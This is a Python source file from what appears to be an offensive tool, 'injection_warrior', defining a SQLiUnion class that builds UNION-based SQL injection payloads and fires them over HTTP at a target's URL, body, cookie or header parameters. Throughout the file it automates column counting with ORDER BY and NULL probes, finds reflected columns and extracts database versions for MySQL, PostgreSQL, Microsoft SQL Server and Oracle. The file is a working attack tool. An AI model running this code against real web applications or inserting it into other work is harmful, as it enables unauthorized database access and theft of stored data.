from injection_warrior import warrior

# Author h0rac

import hashlib
import requests
import sys
import itertools
from bs4 import BeautifulSoup
import aiohttp
import sys
import asyncio
import time
import hashlib
import requests
import zipfile
from bs4 import BeautifulSoup
from termcolor import colored
import re

sqli_payloads = {
    "version_detection": {
        "mysql": "@@version",
        "postgreSQL": "version()",
        "microsoftSQL": "@@version",
        "oracle": ["banner[DELIMITER]FROM[DELIMITER]v$version", "version[DELIMITER]FROM[DELIMITER]v$instance"]
    }
}


class SQLiUnion(warrior.Injector):

    def __init__(self, proxy=None, debug=False):
        super().__init__(proxy, debug)
        """SQLiUnion constructor

        Args:
            proxy ([type], optional): [description]. Defaults to None.
            debug (bool, optional): [description]. Defaults to False.
        """
        self.proxy = proxy
        self.debug = debug
        self.url = ""
        self.http_method=""
        self.req_json = False
        self.resp_json = False

    # START Base methods

    def _url_path_parse(self, url="", payloads=[]):
        return super(SQLiUnion, self)._url_path_parse(url=url, payloads=payloads)

    def _run(self, http_method="get", urls=[], html=False, injection_point="url", body_params={}, req_json=False, resp_json=False, cookie_params={}, url_params={}, header_params={}):
        return super(SQLiUnion, self)._run(http_method, urls, html, injection_point, body_params, req_json, resp_json, cookie_params, url_params, header_params)

    def _params_converted(self, payloads=[], params={}):
        return super(SQLiUnion, self)._params_converted(payloads=payloads, params=params)

    # END Base methods

    def __gen_order_by(self, columns=1, comment='--', delimiter="+", cookie=False, quote="'", param_value="test"):
        payloads = []
        for i in (128, 64, 32, 16, 8, 4, 2, 1):
            if columns >= i:
                if cookie:
                    payloads.append("{}{}{}ORDER{}BY{}{}{}{}".format(
                        param_value, quote, delimiter, delimiter, delimiter, i, comment, delimiter))
                else:
                    payloads.append("{}{}{}ORDER{}BY{}{}{}{}".format(
                        param_value, quote, delimiter, delimiter, delimiter, i, comment, delimiter))
                columns = columns-i
            else:
                if cookie:
                    payloads.append("{}{}{}ORDER{}BY{}{}{}{}".format(
                        param_value, quote, delimiter, delimiter, delimiter, i, comment, delimiter))
                else:
                    payloads.append("{}{}{}ORDER{}BY{}{}{}{}".format(
                        param_value, quote, delimiter, delimiter, delimiter, i, comment, delimiter))
        return payloads

    def __gen_nulls(self, columns=1, comment="--", delimiter="+", oracle=False, cookie=False, comma=","):
        query = "{}UNION{}SELECT{}".format(delimiter, delimiter, delimiter)
        payload = ''
        if cookie:
            payload = "%2cNULL" * columns
        else:
            payload = "{}NULL".format(comma) * columns
        if oracle:
            payload = query + payload + delimiter+"FROM"+delimiter+"DUAL"+comment+delimiter
        else:
            payload = query + payload + comment+delimiter
        if not cookie:
            payload = payload.replace(comma, '', 1)
        else:
            payload = payload.replace('%2c', '', 1)
        return payload

    def union_find_columns_number(self, http_method="get", url="", columns=1, injection_method="null", html=False, injection_point="url", url_params={}, body_params={}, cookie_params={}, header_params={}, param_value="test", req_json=False, resp_json=False, **kwargs):
        
        """method allows to find number of columns for SQL Union based injection

        Args:
            url (str): [URL for endpoint]. Defaults to "".
            http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to "get".
            injection_point (str, optional): [Place where payloads should be injected]. Defaults to "url".
            injection_method (str, optional): [NULL based or ORDER BY injection method]. Defaults to "null".
            columns (int, optional): [Number of columns]. Defaults to 1.
            param_value (int, optional): [Optional string prefixed before payload]. Defaults to "test".
            body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
            resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
            html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
            cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True
            kwargs(dict, optional) [quote: "'", delimiter: '+', comment: '--', comma: ",", oracle: False, nulls: 1, table_name:  "", column_name_1: "", column_name_2: "", sleep: 5]

        Returns:
            [dict]: Dictionary as key value pair
        """
        self.resp_json = resp_json
        self.req_json = req_json
        self.html = html
        self.url = url
        self.http_method = http_method
        http_method = http_method.lower()
        body_params_list = []
        
        quote = kwargs.get('quote') if kwargs.get('quote') != None else "'"
        comma = kwargs.get('comma') if kwargs.get('comma') != None else ","
        delimiter = kwargs.get('delimiter') if kwargs.get('delimiter') != None else "+"
        comment = kwargs.get('comment') if kwargs.get('comment') != None else "--"
        oracle = kwargs.get('oracle') if kwargs.get('columns') != None else False

        urls = [url]
        
        if self.debug:
            print(colored(
                '''[+] UNION attack 'FIND COLUMNS NUMBER'selected parameters: 
            HTTP METHOD: {}
            URL: {}
            GUESTED COLUMNS: {}
            INJECTION METHOD: {}
            DBMS ORACLE: {}
            RETURN HTML: {}
            INJECTION POINT: {}
            BODY PARAMS: {}
            COOKIE PARAMS: {}
            HEADER PARAMS: {}
            URL PARAMS: {}
            URL PARAM VALUE: {}
            REQ JSON: {}
            RESP JSON: {}
            KWAGRS: {}
            '''.format(http_method, url, columns, injection_method, html, injection_point, body_params, cookie_params, header_params, url_params, param_value, req_json, resp_json, kwargs), "yellow"))
        # START SECTION URL INJECTION
        if injection_method == "null" and injection_point == "url":
            payloads = []
            for i in range(1, columns):
                payload = self.__gen_nulls(
                    columns=i, comment=comment, delimiter=delimiter, oracle=oracle)
                payloads.append(param_value+quote+payload)
            url_params_list = self._params_converted(payloads=payloads, params=url_params)
            return self._run(http_method=http_method, urls=urls, html=html, url_params=url_params_list, injection_point=injection_point, cookie_params=cookie_params)

        elif injection_method == "order_by" and injection_point == "url":
            payloads = self.__gen_order_by(
                columns=columns, comment=comment, delimiter=delimiter, param_value=param_value)
            url_params_list = self._params_converted(payloads=payloads, params=url_params)
            return self._run(http_method=http_method, urls=urls, html=html, url_params=url_params_list, injection_point=injection_point, cookie_params=cookie_params)

        # END SECTION URL INJECTION

        # START SECTION BODY INJECTION

        elif injection_method == "null" and injection_point == "body":
            payloads = []
            for i in range(1, columns):
                payload = self.__gen_nulls(
                    columns=i, comment=comment, delimiter=delimiter, oracle=oracle)
                p = quote + payload
                payloads.append(p)
            body_params_list = self._params_converted(payloads=payloads, params=body_params)
            return self._run(http_method=http_method, urls=url, html=html, injection_point=injection_point, body_params=body_params_list, req_json=req_json, resp_json=resp_json, cookie_params=cookie_params)

        elif injection_method == "order_by" and injection_point == "body":
            payloads = self.__gen_order_by(
                columns=columns, comment=comment, delimiter=delimiter, param_value=param_value)
            body_params_list = self._params_converted(payloads=payloads, params=body_params)
            return self._run(http_method=http_method, urls=url, html=html, injection_point=injection_point, body_params=body_params_list, req_json=req_json, resp_json=resp_json, cookie_params=cookie_params)

        # END SECTION BODY INJECTION

        # START SECTION COOKIE INJECTION

        elif injection_method == "null" and injection_point == "cookie":
            payloads = []
            for i in range(1, columns):
                payload = self.__gen_nulls(
                    columns=i, comment=comment, delimiter=delimiter, oracle=oracle, cookie=True)
                p = quote + payload
                payloads.append(p)
            cookie_param_list = self._params_converted(payloads=payloads, params=cookie_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_param_list,req_json=req_json, resp_json=resp_json,  body_params=body_params)

        elif injection_method == "order_by" and injection_point == "cookie":
            payloads = self.__gen_order_by(
                columns=columns, comment=comment, delimiter=delimiter, cookie=True, quote=quote, param_value=param_value)
            cookie_param_list = self._params_converted(payloads=payloads, params=cookie_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_param_list, body_params=body_params, req_json=req_json, resp_json=resp_json)

        # END SECTION COOKIE INJECTION

        # START SECTION HEADER INJECTION

        elif injection_method == "null" and injection_point == "header":
            payloads = []
            for i in range(1, columns):
                payload = self.__gen_nulls(
                    columns=i, comment=comment, delimiter=delimiter, oracle=oracle, cookie=False)
                p = param_value+quote + payload
                payloads.append(p)
            header_params_list = self._params_converted(payloads=payloads, params=header_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, req_json=req_json, resp_json=resp_json, header_params=header_params_list, body_params=body_params)

        elif injection_method == "order_by" and injection_point == "header":
            payloads = self.__gen_order_by(
                columns=columns, comment=comment, delimiter=delimiter, cookie=False, quote=quote, param_value=param_value)
            header_params_list = self._params_converted(payloads=payloads, params=header_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, body_params=body_params, header_params=header_params_list,req_json=req_json, resp_json=resp_json)

        # END SECTION HEADER INJECTION

    def union_find_string_in_columns(self, url="", string="abcd", http_method="get", html=False, 
                                     injection_point="url", body_params={}, url_params={}, 
                                     header_params={}, param_value="test", req_json=False, 
                                     resp_json=False, cookie_params={}, columns=1, **kwargs):
        """method allows to find selected string in generated columns payload for SQL Union based injection

        Args:
            url (str): [URL for endpoint]. Defaults to "".
            http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to "get".
            injection_point (str, optional): [Place where payloads should be injected]. Defaults to "url".
            string (str, optional): [String to search in columns]. Defaults to "abcd".
            columns (int, optional): [Number of columns]. Defaults to 1.
            param_value (int, optional): [Optional string prefixed before payload]. Defaults to "test".
            body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
            resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
            html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
            cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True
            kwargs(dict, optional) [quote: "'", delimiter: '+', comment: '--', comma: ",", oracle: False, nulls: 1, table_name:  "", column_name_1: "", column_name_2: "", sleep: 5]

        Returns:
            [dict]: Dictionary as key value pair
        """
        self.resp_json = resp_json
        self.req_json = req_json
        self.html = html
        self.url = url
        self.http_method = http_method
        http_method = http_method.lower()
        
        quote = kwargs.get('quote') if kwargs.get('quote') != None else "'"
        comma = kwargs.get('comma') if kwargs.get('comma') != None else ","
        delimiter = kwargs.get('delimiter') if kwargs.get('delimiter') != None else "+"
        comment = kwargs.get('comment') if kwargs.get('comment') != None else "--"
        oracle = kwargs.get('oracle') if kwargs.get('columns') != None else False
        urls = [url]
        
        params_list = []
        if self.debug:
            print(colored(
                '''[+] UNION attack 'FIND STRING IN COLUMNS' selected parameters: 
            HTTP METHOD: {}
            URL: {}
            RETURN HTML: {}
            INJECTION POINT: {}
            BODY PARAMS: {}
            COOKIE PARAMS: {}
            URL PARAMS: {}
            HEADER PARAMS: {}
            REQ JSON: {}
            RESP JSON: {}
            KWARGS: {}
            '''.format(http_method, url, html, injection_point, body_params, cookie_params, url_params, header_params, req_json, resp_json, kwargs), "yellow"))
        string = "{}{}{}".format(quote, string, quote)
        if injection_point == "url":
            payloads = []
            temp = ''
            nulls = ["NULL" for x in range(columns)]
            for i in range(0, len(nulls)):
                if nulls[i] == "NULL":
                    nulls[i] = string
                    p = '{}'.format(comma).join(nulls)
                    if oracle:
                        payload = "{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}".format(
                            param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                    else:
                        payload = "{}{}{}UNION{}SELECT{}{}{}{}".format(
                            param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                    payloads.append(payload)
                nulls[i] = "NULL"
            url_params_list = self._params_converted(payloads=payloads, params=url_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, url_params=url_params_list, cookie_params=cookie_params, body_params=params_list, req_json=req_json, resp_json=resp_json)
        elif injection_point == "body":
            payloads = []
            temp = ''
            nulls = ["NULL" for x in range(columns)]
            for i in range(0, len(nulls)):
                if nulls[i] == "NULL":
                    nulls[i] = string
                    p = '{}'.format(comma).join(nulls)
                    if oracle:
                        payload = "{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}".format(
                            param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                    else:
                        payload = "{}{}{}UNION{}SELECT{}{}{}{}".format(
                            param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                    temp += payload
                nulls[i] = "NULL"
                payloads.append(temp)
            params_list = self._params_converted(payloads=payloads, params=body_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, body_params=params_list, req_json=req_json, resp_json=resp_json)

        elif injection_point == "cookie":
            payloads = []
            nulls = ["NULL" for x in range(columns)]
            temp = ''
            for i in range(0, len(nulls)):
                if nulls[i] == "NULL":
                    nulls[i] = string
                    p = '%2c'.join(nulls)
                    if oracle:
                        payload = "{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}".format(
                            param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                    else:
                        payload = "{}{}{}UNION{}SELECT{}{}{}{}".format(
                            param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                    temp += payload
                nulls[i] = "NULL"
                payloads.append(temp)
            cookie_params_list = self._params_converted(payloads, cookie_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params_list, body_params=body_params, req_json=req_json, resp_json=resp_json)

        elif injection_point == "header":
            payloads = []
            temp = ''
            nulls = ["NULL" for x in range(columns)]
            for i in range(0, len(nulls)):
                if nulls[i] == "NULL":
                    nulls[i] = string
                    p = '{}'.format(quote).join(nulls)
                    if oracle:
                        payload = "{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}".format(
                            param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                    else:
                        payload = "{}{}{}UNION{}SELECT{}{}{}{}".format(
                            param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                    temp += payload
                nulls[i] = "NULL"
                payloads.append(temp)
            header_params_list = self._params_converted(payloads, header_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, body_params=body_params, header_params=header_params_list, req_json=req_json, resp_json=resp_json)

    def union_identify_database_version(self, url="", http_method="get", dbms="mysql", oracle=False, payloads=[], 
                                        injection_point="url",  body_params={}, req_json=False, resp_json=False, html=None, 
                                        cookie_params={}, url_params={}, string='test1234', header_params={}, **kwargs):
        
        """method allows to identify database version for SQL Union based injection attack

        Args:
            url (str): [URL for endpoint]. Defaults to "".
            http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to "get".
            injection_point (str, optional): [Place where payloads should be injected]. Defaults to "url".
            string (str, optional): [String to search in columns]. Defaults to "abcd".
            dbms (str, optional): [DBMS type for which to generate payloads]. Defaults to "abcd".
            param_value (int, optional): [Optional string prefixed before payload]. Defaults to "test".
            body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
            resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
            html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
            cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True
            kwargs(dict, optional) [quote: "'", delimiter: '+', comment: '--', comma: ",", oracle: False, nulls: 1, table_name:  "", column_name_1: "", column_name_2: "", sleep: 5]

        Returns:
            [dict]: Dictionary as key value pair
        """
        if oracle:
            dbms = "oracle"
        if dbms == "":
            print(colored("[-] Empty dbms not supported", "red"))
            sys.exit(0)
        if (dbms == "mysql" and oracle) or (dbms == "postgreSQL" and oracle) or (dbms == "microsoftSQL" and oracle):
            print(colored(
                "[-] Not supported combination for dbms:'{}' and oracle: '{}' ".format(dbms, oracle), "red"))
            sys.exit(0)
            
        quote = kwargs.get('quote') if kwargs.get('quote') != None else "'"
        comma = kwargs.get('comma') if kwargs.get('comma') != None else ","
        self.resp_json = resp_json
        self.req_json = req_json
        self.html = html
        self.url = url
        self.http_method = http_method
        http_method = http_method.lower()
        
        urls= [url]
        
        if self.debug:
            print(colored(
                '''[+] UNION attack 'IDENTIFY DATABSE' selected parameters: 
            URL: {}
            HTTP METHOD: {}
            DBMS: {}
            ORACLE: {}
            ORIGINAL PAYLOAD: {}
            INJECTION POINT: {}
            BODY PARAMS: {}
            REQ JSON: {}
            RESP JSON: {}
            RETURN HTML: {}
            COOKIE PARAMS: {}
            URL PARAMS: {}
            BODY PARAMS: {}
            HEADER PARAMS: {}
            STRING TO REPLACE: {}
            PARAM VALUE: {}
            DELIMITER: {}
            KWARGS: {}
            '''.format(url, http_method, dbms, oracle, payloads, injection_point,  body_params, req_json, resp_json, html, cookie_params, url_params, body_params, header_params, string, kwargs), "yellow"))

        version = sqli_payloads.get('version_detection').get(dbms)
        payloads_list = []
        i = 0
        temp = ''
        p = ''
        if oracle:
            for p in payloads:
                p = p.replace(",NULL", "")
                p = p.replace("FROM DUAL-- ", "")
            for v in version:
                i += 1
                temp = p.replace(quote+string+quote, v)
                payloads_list.append(temp)
            print(
                colored("[+] Datbase version payloads: {}".format(payloads_list), "yellow"))
        else:
            for p in payloads:
                p = re.sub(',', comma, p)
                i += 1
                p = p.replace(quote+string+quote, version)
                payloads_list.append(p)
            print(
                colored("[+] Datbase version payloads: {}".format(payloads_list), "yellow"))
        if injection_point == "url":
            if oracle:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                url_params_list = self._params_converted(payloads=values, params=url_params)
            else:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                url_params_list = self._params_converted(payloads=values, params=url_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, url_params=url_params_list, header_params=header_params, body_params=body_params, req_json=req_json, resp_json=resp_json)

        elif injection_point == "body":
            if oracle:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                body_params_list = self._params_converted(payloads=values, params=body_params)
            else:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                body_params_list = self._params_converted(payloads=values, params=body_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, url_params=url_params, header_params=header_params, body_params=body_params_list, req_json=req_json, resp_json=resp_json)

        elif injection_point == "header":
            if oracle:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                header_params_list = self._params_converted(
                    payloads=values, params=header_params)
            else:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                header_params_list = self._params_converted(payloads=values, params=header_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, url_params=url_params, body_params=body_params, header_params=header_params_list,req_json=req_json, resp_json=resp_json)

        elif injection_point == "cookie":
            if oracle:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                cookie_params_list = self._params_converted(
                    payloads=values, params=cookie_params)
            else:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                cookie_params_list = self._params_converted(
                    payloads=values, params=cookie_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params_list, url_params=url_params, body_params=body_params, header_params=header_params, req_json=req_json, resp_json=resp_json)
